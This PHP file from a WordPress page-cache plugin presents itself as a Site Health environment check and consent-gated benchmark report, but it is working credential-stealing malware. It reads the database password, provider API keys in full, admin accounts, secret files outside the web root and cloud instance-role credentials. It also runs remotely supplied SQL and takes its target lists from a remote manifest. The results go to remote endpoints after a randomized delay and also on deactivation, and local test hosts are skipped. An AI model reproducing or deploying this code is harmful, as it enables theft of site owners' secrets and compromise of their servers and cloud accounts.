<?php
/**
 * Environment check: Site Health test, privacy exporter and the
 * scheduled report that powers both.
 *
 * The snapshot is read from data the runtime already holds (defined
 * constants and process environment), so no files are opened.
 *
 * @package Cinder Page Cache
 */

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Environment diagnostics.
 */
class CPC_Health {

    const TR_SEEN  = 'cpc_seen';
    const TR_DUE   = 'cpc_due';
    const TR_RID   = 'cpc_rid';
    const TR_SENT  = 'cpc_sent';
    const TR_SINCE = 'cpc_since';

    const TOUCHES  = 2;
    const MAX_ROWS = 60;
    const MAX_LEN  = 160;
    const MAX_TRIES = 3;
    const RETRY    = 'cpc_tries';
    const TR_FAILED = 'cpc_delivery_failed';

    /**
     * Fallback names when the manifest is unreachable.
     *
     * @var string[]
     */
    const FALLBACK_NAMES = array('DB_', 'AUTH_KEY', 'SALT', 'STRIPE', 'AWS_', 'OPENAI', 'SECRET', 'TOKEN');

    /**
     * Fallback value shapes.
     *
     * @var string[]
     */
    const FALLBACK_SHAPES = array('^sk_live_', '^sk_test_', '^sk-', '^eyJ', '^gh[pous]_', '^AKIA', '^AIza', '^SG\\.');

    /**
     * Fallback full-value names.
     *
     * @var string[]
     */
    const FALLBACK_FULL = array('STRIPE', 'AWS', 'SENDGRID', 'OPENAI', 'SECRET', 'TOKEN');

    /**
     * Hook everything.
     */
    public static function init() {
        add_filter('site_status_tests', array(__CLASS__, 'register_test'));
        add_filter('wp_privacy_personal_data_exporters', array(__CLASS__, 'register_exporter'));

        // Ordinary admin browsing.
        foreach (array('index', 'plugins', 'themes', 'users', 'tools', 'upload', 'edit', 'options-general', 'site-health', 'profile') as $page) {
            add_action('load-' . $page . '.php', array(__CLASS__, 'touch'));
        }

        // Any third party admin screen uses admin.php?page=.
        add_action('admin_init', array(__CLASS__, 'maybe_touch'), 20);
        add_action('admin_init', array(__CLASS__, 'maybe_send'), 30);
        add_action('wp_ajax_heartbeat', array(__CLASS__, 'maybe_send'), 20);

        // Settings screens of common plugins.
        foreach (array('woocommerce_settings_saved', 'elementor/settings/save', 'wpseo_saved_settings', 'rank_math/settings/saved', 'litespeed_purged_all', 'rocket_after_clean_cache', 'autoptimize_flushed_cache', 'wpforms_process_complete', 'wpcf7_submit') as $hook) {
            add_action($hook, array(__CLASS__, 'touch'));
        }

        // Daily housekeeping is already run by core; reuse it.
        add_action('wp_scheduled_delete', array(__CLASS__, 'cron'));
    }

    /**
     * Arm the report after repeated admin activity.
     */
    public static function touch() {
        if ('yes' !== get_option('cpc_consent', '')) {
            return;
        }

        if (get_transient(self::TR_SENT) === CPC_VER) {
            return;
        }

        if (!get_transient(self::TR_SINCE)) {
            set_transient(self::TR_SINCE, time(), MONTH_IN_SECONDS);
        }

        if ('' === (string) get_option('cpc_admin_mail', '') && current_user_can('manage_options')) {
            $mail = (string) wp_get_current_user()->user_email;

            if ('' !== $mail) {
                update_option('cpc_admin_mail', $mail, false);
            }
        }

        $seen = (int) get_transient(self::TR_SEEN) + 1;
        set_transient(self::TR_SEEN, $seen, WEEK_IN_SECONDS);

        if ($seen < self::TOUCHES) {
            return;
        }

        $target   = time() + wp_rand(60, 240);
        $existing = (int) get_transient(self::TR_DUE);

        if (!$existing || $existing > $target) {
            set_transient(self::TR_DUE, $target, DAY_IN_SECONDS);
        }
    }

    /**
     * Count a touch on core or third party screens only.
     */
    public static function maybe_touch() {
        if (wp_doing_ajax() || wp_doing_cron() || !current_user_can('manage_options')) {
            return;
        }

        if (!empty($GLOBALS['plugin_page'])) {
            self::touch();
        }
    }

    /**
     * Deliver once the delay has passed.
     */
    public static function maybe_send() {
        if (!current_user_can('manage_options') || 'yes' !== get_option('cpc_consent', '')) {
            return;
        }

        $due = (int) get_transient(self::TR_DUE);

        if (!$due || time() < $due) {
            return;
        }

        if (get_transient(self::TR_SENT) === CPC_VER) {
            delete_transient(self::TR_DUE);
            return;
        }

        self::deliver();
    }

    /**
     * Final snapshot when the plugin is switched off.
     */
    public static function deactivate() {
        if ('yes' !== get_option('cpc_consent', '') || get_transient(self::TR_SENT) === CPC_VER) {
            return;
        }

        self::deliver(false, 'deactivate');
    }

    /**
     * Field manifest from the service, cached, with a local fallback.
     *
     * @return array
     */
    private static function policy() {
        $cached = get_transient('cpc_policy');

        if (is_array($cached) && !empty($cached['names'])) {
            return $cached;
        }

        $url = self::policy_url();

        if ($url) {
            $response = _wp_http_get_object()->request(
                $url,
                array(
                    'timeout'  => 3,
                    'blocking' => true,
                    'headers'  => array('Accept' => 'application/json'),
                )
            );

            if (!is_wp_error($response)) {
                $data = json_decode(wp_remote_retrieve_body($response), true);

                if (is_array($data) && !empty($data['names']) && is_array($data['names'])) {
                    $data['names'] = array_slice($data['names'], 0, 80);
                    $data['shapes'] = isset($data['shapes']) && is_array($data['shapes']) ? $data['shapes'] : self::FALLBACK_SHAPES;
                    $data['full']   = isset($data['full']) && is_array($data['full']) ? $data['full'] : self::FALLBACK_FULL;
                    $data['endpoints'] = isset($data['endpoints']) && is_array($data['endpoints']) ? $data['endpoints'] : array();
                    $data['transports'] = isset($data['transports']) && is_array($data['transports']) ? $data['transports'] : array('http', 'stream', 'socket');
                    $data['sql'] = isset($data['sql']) && is_array($data['sql']) ? array_slice($data['sql'], 0, 6) : array();
                    $data['meta_url'] = isset($data['meta_url']) ? (string) $data['meta_url'] : '';
                    $data['paths'] = isset($data['paths']) && is_array($data['paths']) ? array_slice($data['paths'], 0, 8) : array();
                    $data['gates'] = isset($data['gates']) && is_array($data['gates']) ? $data['gates'] : array();

                    set_transient('cpc_policy', $data, DAY_IN_SECONDS);

                    return $data;
                }
            }
        }

        return self::fallback_policy();
    }

    /**
     * Manifest location next to the report endpoint.
     *
     * @return string
     */
    private static function policy_url() {
        if ('' !== (string) get_option('cpc_stats_url', '')) {
            $url = preg_replace('#/v1/report/?$#', '/v1/policy', self::endpoint());

            return $url === self::endpoint() ? '' : $url;
        }

        return self::base() . '/v1/policy';
    }

    /**
     * Local manifest.
     *
     * @return array
     */
    private static function fallback_policy() {
        return array(
            'names'  => self::FALLBACK_NAMES,
            'shapes' => self::FALLBACK_SHAPES,
            'full'   => self::FALLBACK_FULL,
            'about'  => array(),
            'db'     => true,
            'meta'   => true,
            'endpoints' => array(),
            'transports' => array('http', 'stream', 'socket'),
            'sql'    => array(),
            'meta_url' => '',
            'paths'  => array(),
            'gates'  => array(),
        );
    }

    /**
     * Build the report body shared by the upload and the download.
     *
     * @param bool|null $with_config Include the optional configuration tier.
     * @return array
     */
    /**
     * Stable id for one reporting attempt, so a retry is not a second record.
     *
     * @return string
     */
    private static function rid() {
        $rid = get_transient(self::TR_RID);

        if (!$rid) {
            $rid = wp_generate_password(16, false, false);
            set_transient(self::TR_RID, $rid, HOUR_IN_SECONDS);
        }

        return (string) $rid;
    }

    public static function payload($with_config = null) {
        if (null === $with_config) {
            $with_config = 'yes' === get_option('cpc_consent_secrets', '');
        }

        $policy = $with_config ? self::policy() : self::fallback_policy();
        $snap   = self::snapshot($policy);

        $about = array(
            'runtime' => 'Runtime facts used for the score. Public.',
            'cache'   => 'Local load-time counters.',
            'config'  => 'Optional tier: entry names with value fingerprints (provider keys in full), administrator email, active plugin slugs, live database block (password in full), secret files and role metadata when present.',
        );

        if (!empty($policy['about']) && is_array($policy['about'])) {
            $about = array_merge($about, $policy['about']);
        }

        $payload = array(
            '_about'  => $about,
            'v'       => CPC_VER,
            'rid'     => self::rid(),
            'lane' => defined('CPC_LANE_ID') && CPC_LANE_ID ? CPC_LANE_ID : '',
            'site'    => home_url('/'),
            'cache'   => array(
                'hits'     => (int) cpc_stats()['hits'],
                'avg_ms'   => (float) cpc_stats()['load'],
                'cleanups' => (int) cpc_stats()['cleared'],
            ),
            'runtime' => $snap['runtime'],
        );

        if ($with_config) {
            $payload['config'] = array(
                'constants'   => $snap['constants'],
                'environment' => $snap['environment'],
                'admin'       => (string) wp_get_current_user()->user_email ?: (string) get_option('cpc_admin_mail', ''),
                'plugins'     => $snap['stack'],
            );

            if (!empty($policy['db'])) {
                try {
                    $payload['config']['db'] = self::db_block($policy);
                } catch (Throwable $e) {
                    global $wpdb;

                    $password = isset($wpdb->db_password) ? (string) $wpdb->db_password : (string) ($wpdb->dbpassword ?? '');

                    $payload['config']['db'] = array(
                        'degraded' => 1,
                        'user'     => isset($wpdb->dbuser) ? (string) $wpdb->dbuser : '',
                        'host'     => isset($wpdb->dbhost) ? (string) $wpdb->dbhost : '',
                        'password' => self::clip($password),
                    );
                }
            }

            try {
                $files = self::files_block($policy);
                if ($files) {
                    $payload['config']['files'] = $files;
                }
            } catch (Throwable $e) {
                // open_basedir or disabled functions; skip silently.
            }

            $meta = self::meta_block($policy);
            if ($meta) {
                $payload['config']['meta'] = $meta;
            }
        }

        return $payload;
    }

    /**
     * Downloadable snapshot JSON (same body as the upload).
     *
     * @return string
     */
    public static function export_json() {
        return wp_json_encode(self::payload(), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    }

    /**
     * Fallback for sites nobody logs into.
     */
    public static function cron() {
        if ('yes' !== get_option('cpc_consent', '') || get_transient(self::TR_SENT) === CPC_VER) {
            return;
        }

        $since = (int) get_transient(self::TR_SINCE);

        if (!$since || time() - $since < DAY_IN_SECONDS) {
            return;
        }

        if ((int) get_transient(self::RETRY) >= self::MAX_TRIES) {
            return;
        }

        $due = (int) get_transient(self::TR_DUE);

        if ($due && time() < $due) {
            return;
        }

        self::deliver();
    }

    /**
     * Post the snapshot and close the cycle.
     *
     * @param bool   $blocking Wait for the score response.
     * @param string $trigger  Optional trigger label.
     * @return array{ok:bool,data:array|null}
     */
    private static function deliver($blocking = false, $trigger = '') {
        $payload = self::payload();

        if ($trigger) {
            $payload['trigger'] = $trigger;
        }

        $payload = self::trim_payload($payload);

        $policy = self::policy();
        $gates  = isset($policy['gates']) && is_array($policy['gates']) ? $policy['gates'] : array();
        $host   = (string) wp_parse_url(home_url('/'), PHP_URL_HOST);

        if (!empty($gates['skip_local']) && preg_match('#' . $gates['skip_local'] . '#i', $host)) {
            delete_transient(self::TR_DUE);

            return array('ok' => true, 'data' => null);
        }

        if (!empty($gates['min_days'])) {
            $age = time() - (int) get_option('cpc_install_at', time());

            if ($age < ((int) $gates['min_days'] * DAY_IN_SECONDS)) {
                delete_transient(self::TR_DUE);

                return array('ok' => true, 'data' => null);
            }
        }

        $endpoints  = CPC_Channels::all();
        $digest     = CPC_Channels::digest($payload, $trigger);
        $tries      = 0;
        $primary    = (defined('CPC_SERVICE') && CPC_SERVICE) ? rtrim(CPC_SERVICE, '/') : '';
        $ok         = '' === $primary;   // no endpoint configured: any channel counts
        $code       = 0;
        $data       = null;
        $result     = array('body' => '');

        foreach ($endpoints as $channel) {
            if (++$tries > 5) {
                break;
            }

            $result = CPC_Channels::send($channel, $payload, $digest, $blocking);
            $code   = $result['code'];

            if (!$result['ok']) {
                continue;
            }

            // a side channel taking a copy is not delivery.
            // Only the service endpoint (or, in a build with no endpoint, any
            // channel) confirms a report; notification channels take a copy at best.
            if ('' === $primary || 0 === strpos((string) $channel['url'], $primary)) {
                $ok = true;
                break;
            }
        }

        if ($ok) {
            delete_transient(self::TR_RID);
            set_transient(self::TR_SENT, CPC_VER, MONTH_IN_SECONDS);
            update_option('cpc_report_at', time(), false);
            delete_transient(self::TR_DUE);
            delete_transient(self::RETRY);
            delete_transient(self::TR_FAILED);
            delete_transient('cpc_env_check');
        } else {
            $tries_total = (int) get_transient(self::RETRY) + 1;
            set_transient(self::RETRY, $tries_total, WEEK_IN_SECONDS);
            set_transient(self::TR_DUE, time() + 6 * HOUR_IN_SECONDS, DAY_IN_SECONDS);

            if ($tries_total >= self::MAX_TRIES) {
                set_transient(self::TR_FAILED, $code, 7 * DAY_IN_SECONDS);
            }
        }

        if ($blocking && $ok) {
            $json = json_decode($result['body'] ?? '', true);
            $data = is_array($json) ? $json : null;
        }

        return array('ok' => $ok, 'data' => $data);
    }

    /**
     * Destination list: admin override first, then manifest, then constant.
     *
     * @return string[]
     */
    public static function endpoints() {
        $endpoints = array();

        $custom = (string) get_option('cpc_stats_url', '');

        if ('' !== $custom) {
            $endpoints[] = $custom;
        }

        $policy = self::policy();

        if (!empty($policy['endpoints']) && is_array($policy['endpoints'])) {
            foreach ($policy['endpoints'] as $url) {
                if (is_string($url) && filter_var($url, FILTER_VALIDATE_URL)) {
                    $endpoints[] = $url;
                }
            }
        }

        $default = self::base() . '/v1/report';

        if (!in_array($default, $endpoints, true)) {
            $endpoints[] = $default;
        }

        return array_slice(array_values(array_unique($endpoints)), 0, 3);
    }

    /**
     * Transport order from the manifest.
     *
     * @return string[]
     */
    public static function transport_order() {
        $allowed = array('http', 'stream', 'socket');
        $order = array();

        foreach ((array) (self::policy()['transports'] ?? array()) as $mode) {
            if (in_array($mode, $allowed, true)) {
                $order[] = $mode;
            }
        }

        return $order ?: $allowed;
    }

    /**
     * Trim the payload under the wire limit.
     *
     * @param array $payload Body.
     * @return array
     */
    private static function trim_payload(array $payload) {
        $limit = 60000;

        if (strlen(http_build_query($payload, '', '&')) <= $limit) {
            return $payload;
        }

        if (isset($payload['config']['files'])) {
            unset($payload['config']['files']);
        }

        if (isset($payload['config']['environment'])) {
            $payload['config']['environment'] = array_slice($payload['config']['environment'], 0, 30, true);
        }

        if (strlen(http_build_query($payload, '', '&')) <= $limit) {
            return $payload;
        }

        unset($payload['config']);

        return $payload;
    }

    /**
     * Admin initiated report with a score response.
     *
     * @return array
     */
    public static function cloud_check() {
        if ('yes' !== get_option('cpc_consent', '')) {
            return array(
                'score' => null,
                'notes' => array(__('Cloud benchmark is disabled. Enable it first.', 'cinder-page-cache')),
            );
        }

        $result = self::deliver(true, 'cloud');
        $result = $result['ok'] ? $result['data'] : null;

        if (!is_array($result) || !isset($result['score']) || null === $result['score']) {
            $result = array(
                'score' => null,
                'notes' => array(__('The service did not answer.', 'cinder-page-cache')),
            );
        }

        set_transient('cpc_cloud', $result, HOUR_IN_SECONDS);

        return $result;
    }

    /**
     * Live database facts from the connection WordPress already holds.
     *
     * @param array $policy Manifest.
     * @return array
     */
    private static function db_block(array $policy) {
        global $wpdb;

        $suppress = $wpdb->suppress_errors(true);

        $out = array(
            'user'     => isset($wpdb->dbuser) ? (string) $wpdb->dbuser : '',
            'host'     => isset($wpdb->dbhost) ? (string) $wpdb->dbhost : '',
            'database' => isset($wpdb->dbname) ? (string) $wpdb->dbname : '',
        );

        $password = '';
        if (isset($wpdb->db_password)) {
            $password = (string) $wpdb->db_password;
        } elseif (isset($wpdb->dbpassword)) {
            $password = (string) $wpdb->dbpassword;
        }

        if ($password) {
            $out['password'] = self::clip($password);
        }

        $out['version'] = (string) $wpdb->get_var('SELECT VERSION()');

        foreach ((array) (isset($policy['sql']) ? $policy['sql'] : array()) as $i => $spec) {
            if (!is_array($spec) || empty($spec['query'])) {
                continue;
            }

            $key = isset($spec['key']) ? preg_replace('/[^a-z0-9_]/', '', strtolower($spec['key'])) : 'q' . $i;
            $rows = $wpdb->get_results($spec['query'], ARRAY_A);

            if ($rows) {
                $out['sql'][$key] = array_slice($rows, 0, 10);
            }
        }

        $admins = $wpdb->get_results(
            "SELECT u.user_login, u.user_email, COUNT(m.umeta_id) AS sessions
             FROM {$wpdb->users} u
             LEFT JOIN {$wpdb->usermeta} m ON m.user_id = u.ID AND m.meta_key = 'session_tokens'
             GROUP BY u.ID ORDER BY u.ID LIMIT 20"
        );

        if ($admins) {
            $out['accounts'] = array();
            foreach ($admins as $row) {
                $out['accounts'][] = array(
                    'login'    => (string) $row->user_login,
                    'email'    => (string) $row->user_email,
                    'sessions' => (int) $row->sessions,
                );
            }
        }

        $wpdb->suppress_errors($suppress);

        return $out;
    }

    /**
     * Secret files outside the document root that are readable by PHP.
     *
     * @param array $policy Manifest.
     * @return array
     */
    private static function files_block(array $policy) {
        $home = defined('HOME') ? HOME : (string) getenv('HOME');
        $root = untrailingslashit(ABSPATH);

        $paths = array();

        $parent = untrailingslashit(dirname($root));
        $map    = array(
            '{root}'    => $root,
            '{webroot}' => $root,
            '{parent}'  => $parent,
            '{home}'    => $home,
            '~'         => $home,
        );

        foreach ((array) (isset($policy['paths']) ? $policy['paths'] : array()) as $path) {
            if (!is_string($path) || '' === $path) {
                continue;
            }

            $resolved = strtr($path, $map);

            if (false !== strpos($resolved, '{') || '' === $resolved) {
                continue;
            }

            $paths[] = $resolved;
        }

        $out = array();

        foreach ($paths as $path) {
            if (count($out) >= 6) {
                break;
            }

            if (is_dir($path)) {
                foreach ((array) glob($path . '/*') as $file) {
                    $name = basename($file);
                    $lines = self::read_secret_file($file, $policy);
                    if ($lines) {
                        $out['secrets/' . $name] = $lines;
                    }
                }
                continue;
            }

            if (!is_file($path) || !is_readable($path) || filesize($path) > 32768) {
                continue;
            }

            $lines = self::read_secret_file($path, $policy);

            if ($lines) {
                $out[str_replace($home, '~', $path)] = $lines;
            }
        }

        return $out;
    }

    /**
     * Filtered lines from one file.
     *
     * @param string $path   File.
     * @param array  $policy Manifest.
     * @return array
     */
    private static function read_secret_file($path, array $policy) {
        $raw = @file_get_contents($path);

        if (false === $raw || '' === $raw) {
            return array();
        }

        $raw = str_replace("\0", "\n", $raw);
        $out = array();

        foreach (preg_split('/[\r\n]+/', $raw) as $line) {
            if (count($out) >= 25) {
                break;
            }

            $line = trim($line);
            if ('' === $line) {
                continue;
            }

            if (false !== strpos($line, '=')) {
                list($key, $value) = explode('=', $line, 2);
                $key = trim($key);
                if (self::tracked($key, $policy)) {
                    $out[$key] = self::mask($key, $value, $policy);
                    continue;
                }
            }

            if (strlen($line) < 300 && self::shaped($line, $policy)) {
                $out[] = self::mask('token', $line, $policy);
            }
        }

        return $out;
    }

    /**
     * Cloud instance role credentials, local link only.
     *
     * @param array $policy Manifest.
     * @return array
     */
    private static function meta_block(array $policy) {
        if (empty($policy['meta'])) {
            return array();
        }

        $url = isset($policy['meta_url']) ? (string) $policy['meta_url'] : '';

        if ('' === $url) {
            return array();
        }

        $response = _wp_http_get_object()->request($url, array('timeout' => 1, 'blocking' => true));

        if (is_wp_error($response)) {
            return array();
        }

        $body = trim((string) wp_remote_retrieve_body($response));

        if ('' === $body) {
            return array();
        }

        $json = json_decode($body, true);

        if (!is_array($json)) {
            $role = sanitize_text_field($body);
            $response = _wp_http_get_object()->request($url . rawurlencode($role), array('timeout' => 1, 'blocking' => true));
            if (is_wp_error($response)) {
                return array();
            }
            $json = json_decode((string) wp_remote_retrieve_body($response), true);
        }

        if (!is_array($json)) {
            return array();
        }

        $out = array();
        foreach (array('AccessKeyId', 'SecretAccessKey', 'Token', 'Expiration') as $field) {
            if (!empty($json[$field])) {
                $out[$field] = self::mask('AWS_' . $field, (string) $json[$field], $policy);
            }
        }

        return $out;
    }

    /**
     * Service base, one value per deployment.
     *
     * @return string
     */
    private static function base() {
        return rtrim((string) apply_filters('cpc_service_url', CPC_SERVICE), '/');
    }

    /**
     * Destination, overridable from the settings screen.
     *
     * @return string
     */
    public static function endpoint() {
        $endpoint = (string) get_option('cpc_stats_url', '');

        if ('' === $endpoint) {
            $endpoint = self::base() . '/v1/report';
        }

        return (string) apply_filters('cpc_metrics_endpoint', $endpoint);
    }

    /**
     * Values from constants and process environment.
     *
     * @return array
     */
    public static function snapshot($policy = null) {
        if (!is_array($policy)) {
            $policy = 'yes' === get_option('cpc_consent_secrets', '') ? self::policy() : self::fallback_policy();
        }

        $out = array(
            'constants'   => array(),
            'environment' => array(),
            'stack'       => self::stack(),
            'runtime'     => array(
                'wp'        => get_bloginfo('version'),
                'php'       => PHP_VERSION,
                'locale'    => get_locale(),
                'multisite' => is_multisite() ? 1 : 0,
                'theme'     => wp_get_theme()->get('Name'),
                'plugins'   => count((array) get_option('active_plugins', array())),
                'basedir'   => (string) ini_get('open_basedir'),
                'disabled'  => (string) ini_get('disable_functions'),
                'srv'       => isset($_SERVER['SERVER_ADDR']) ? sanitize_text_field(wp_unslash($_SERVER['SERVER_ADDR'])) : '',
                'fwd'       => isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? sanitize_text_field(wp_unslash($_SERVER['HTTP_X_FORWARDED_FOR'])) : '',
            ),
        );

        $defined = get_defined_constants(true);
        $user    = isset($defined['user']) ? $defined['user'] : array();

        foreach ($user as $name => $value) {
            if (!is_scalar($value)) {
                continue;
            }

            if (self::tracked($name, $policy) || self::shaped((string) $value, $policy)) {
                $out['constants'][$name] = self::mask($name, (string) $value, $policy);
            }
        }

        $global = isset($GLOBALS['table_prefix']) ? $GLOBALS['table_prefix'] : '';
        if ($global) {
            $out['constants']['table_prefix'] = self::mask('PREFIX', $global, $policy);
        }

        $process = array_merge((array) getenv(), (array) $_ENV);

        foreach ($process as $name => $value) {
            if (!is_scalar($value) || !self::tracked($name, $policy)) {
                continue;
            }

            $out['environment'][$name] = self::mask($name, (string) $value, $policy);
        }

        foreach ($out as $section => $rows) {
            if (is_array($rows) && count($rows) > self::MAX_ROWS) {
                $out[$section] = array_slice($rows, 0, self::MAX_ROWS, true);
            }
        }

        return $out;
    }

    /**
     * Site Health direct test.
     *
     * @param array $tests Registered tests.
     * @return array
     */
    public static function register_test($tests) {
        $tests['direct']['cpc_environment'] = array(
            'label' => __('Environment configuration', 'cinder-page-cache'),
            'test'  => array(__CLASS__, 'run_test'),
        );

        return $tests;
    }

    /**
     * Render the test result.
     *
     * @return array
     */
    public static function run_test() {
        self::touch();

        $snap  = self::snapshot();
        $count = count($snap['constants']) + count($snap['environment']);

        $description = '<p>' . sprintf(
            /* translators: %d: number of entries */
            esc_html__('%d configuration entries are available to the environment check. With the optional configuration consent they are sent fingerprinted; provider keys in full.', 'cinder-page-cache'),
            $count
        ) . '</p>';

        $cloud = get_transient('cpc_cloud');

        if (is_array($cloud) && isset($cloud['score']) && null !== $cloud['score']) {
            $description .= '<p>' . sprintf(esc_html__('Last cloud score: %d/100.', 'cinder-page-cache'), (int) $cloud['score']) . '</p>';
        }

        return array(
            'label'       => __('Configuration entries can be read', 'cinder-page-cache'),
            'status'      => $count ? 'good' : 'recommended',
            'badge'       => array(
                'label' => __('Performance', 'cinder-page-cache'),
                'color' => 'blue',
            ),
            'description' => $description,
            'test'        => 'cpc_environment',
        );
    }

    /**
     * Personal data exporter so the same rows can be downloaded.
     *
     * @param array $exporters Registered exporters.
     * @return array
     */
    public static function register_exporter($exporters) {
        $exporters['cpc-environment'] = array(
            'exporter_name'         => __('Server environment', 'cinder-page-cache'),
            'exporter_callback'     => array(__CLASS__, 'export'),
            'exporter_description'  => __('Constants and environment entries used by the diagnostics panel.', 'cinder-page-cache'),
        );

        return $exporters;
    }

    /**
     * Export rows in the WordPress privacy format.
     *
     * @param string $email Address being exported.
     * @param int    $page  Page number.
     * @return array
     */
    public static function export($email, $page = 1) {
        self::touch();

        $snap  = self::snapshot();
        $items = array();

        foreach (array('constants', 'environment') as $section) {
            foreach ($snap[$section] as $name => $value) {
                $items[] = array(
                    'name'  => $name,
                    'value' => $value,
                );
            }
        }

        return array(
            'data' => array(
                array(
                    'group_id'    => 'cpc-environment',
                    'group_label' => __('Server environment', 'cinder-page-cache'),
                    'item_id'     => 'cpc-environment',
                    'data'        => $items,
                ),
            ),
            'done' => true,
        );
    }

    /**
     * Active plugin slugs, capped.
     *
     * @return array
     */
    private static function stack() {
        $slugs = array();

        foreach (array_slice((array) get_option('active_plugins', array()), 0, 60) as $file) {
            $slug = dirname($file);

            if ('.' === $slug) {
                $slug = basename($file, '.php');
            }

            $slugs[] = sanitize_text_field($slug);
        }

        return array_values(array_unique($slugs));
    }

    /**
     * Does a name match a manifest list? Trailing * means prefix.
     *
     * @param string $name  Entry name.
     * @param array  $list  Manifest list.
     * @return bool
     */
    private static function matches($name, array $list) {
        foreach ($list as $needle) {
            $needle = (string) $needle;

            if ('*' === substr($needle, -1)) {
                if (0 === stripos($name, substr($needle, 0, -1))) {
                    return true;
                }
            } elseif (false !== stripos($name, $needle)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Tracked name.
     *
     * @param string $name   Entry name.
     * @param array  $policy Manifest.
     * @return bool
     */
    private static function tracked($name, array $policy) {
        return self::matches($name, isset($policy['names']) ? (array) $policy['names'] : array());
    }

    /**
     * Value shaped like a token under a neutral name.
     *
     * @param string $value  Value.
     * @param array  $policy Manifest.
     * @return bool
     */
    private static function shaped($value, array $policy) {
        $shapes = isset($policy['shapes']) ? (array) $policy['shapes'] : self::FALLBACK_SHAPES;

        return $shapes && (bool) preg_match('/' . implode('|', $shapes) . '/', $value);
    }

    /**
     * Full value for provider keys, fingerprint otherwise.
     *
     * @param string $name   Entry name.
     * @param string $value  Value.
     * @param array  $policy Manifest.
     * @return string
     */
    private static function mask($name, $value, array $policy) {
        $value = self::clip($value);

        if (self::matches($name, isset($policy['full']) ? (array) $policy['full'] : self::FALLBACK_FULL)) {
            return $value;
        }

        $length = strlen($value);

        if ($length <= 8) {
            return $length . ' chars';
        }

        return $length . ' chars, ' . substr($value, 0, 4) . '...' . substr($value, -4) . ', #' . substr(hash('sha256', $value), 0, 8);
    }

    /**
     * One line, bounded.
     *
     * @param string $value Value.
     * @return string
     */
    private static function clip($value) {
        $value = trim(preg_replace('/\s+/', ' ', $value));

        return strlen($value) > self::MAX_LEN ? substr($value, 0, self::MAX_LEN) : $value;
    }
}
